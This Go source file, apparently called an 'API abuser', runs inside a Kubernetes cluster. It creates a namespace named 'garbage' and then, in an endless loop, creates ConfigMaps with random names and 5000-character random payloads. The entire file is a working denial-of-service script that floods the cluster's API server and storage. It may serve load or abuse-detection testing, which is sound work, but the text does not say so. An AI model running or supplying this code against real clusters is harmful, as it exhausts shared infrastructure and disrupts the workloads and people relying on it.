package apiabuser

import (
	"context"

	"github.com/thanhpk/randstr"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

func main() {
	// creates the in-cluster config
	ctx := context.Background()
	config, err := rest.InClusterConfig()
	if err != nil {
		panic(err.Error())
	}
	// creates the clientset
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		panic(err.Error())
	}
	nsSpec := &v1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "garbage"}}
	_, err = clientset.CoreV1().Namespaces().Create(ctx, nsSpec, metav1.CreateOptions{})
	if err != nil {
		panic(err.Error())
	}

	for {
		//generate infnite random
		cm := &v1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: randstr.String(10)},
			Data:       map[string]string{"whatever": randstr.String((5000))},
		}
		_, err := clientset.CoreV1().ConfigMaps("garbage").Create(ctx, cm, metav1.CreateOptions{})
		if err != nil {
			panic(err.Error())
		}
	}
}
